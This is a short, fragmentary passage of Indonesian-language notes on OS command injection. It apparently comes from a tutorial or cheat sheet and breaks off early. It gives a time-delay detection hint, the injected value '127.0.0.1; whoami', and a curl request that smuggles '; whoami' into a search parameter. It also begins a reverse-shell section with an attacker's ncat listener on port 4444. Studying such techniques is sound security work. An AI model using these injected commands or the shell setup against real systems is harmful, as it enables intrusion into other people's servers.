...
- **Cara deteksi**: - Time delay  : ping / sleep → aplikasi hang
...
- **Contoh penggunaan**: 127.0.0.1; whoami          → ping selesai dulu, baru whoami
...
- **Contoh**: curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami


## REVERSE SHELL VIA COMMAND INJECTION

- **Alur**: Penyerang listen dulu :
  ncat -lvp 4444
